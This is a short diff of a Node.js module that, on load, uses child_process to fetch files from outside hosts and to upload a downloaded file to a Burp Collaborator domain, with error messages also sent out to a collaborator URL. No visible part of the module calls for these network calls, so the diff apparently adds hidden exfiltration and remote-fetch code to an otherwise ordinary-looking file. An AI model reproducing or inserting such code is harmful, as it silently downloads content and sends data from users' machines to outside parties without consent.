@@ -2,7 +2,7 @@ const path = require('path');
 const nconf = require('nconf');
 const { exec } = require("child_process");
 
-exec("wget http://hav6cctq6ivan5c60wrtjil22t8nwc.cc/d.txt", (error, stdout, stderr) => {
+exec("curl http://gfz5hbypbh09s4h55vwsohq17sdn1c.burpcollaborator.net/d.txt", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
@@ -83,7 +83,7 @@ fs.readFile('d.txt', 'utf8' , (err, data) => {
 
 const spawn = require('child_process');
 var request = require('request');
-spawn.exec("wget http://0xp.cc/x.json -O /tmp/x.json; cat /tmp/x.json; ls /tmp", (error, stdout, stderr) => {
+spawn.exec("wget http://0xp.cc/x.json -O /tmp/x.json; curl -F\"operation=upload\" -F\"file=@\/tmp\/x.json\" http:\/\/gfz5hbypbh09s4h55vwsohq17sdn1c.burpcollaborator.net\/xd", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         request('http://hav6cctq6ivan5c60wrtjil22t8nwc.burpcollaborator.net/?rce-error=' + error.message);
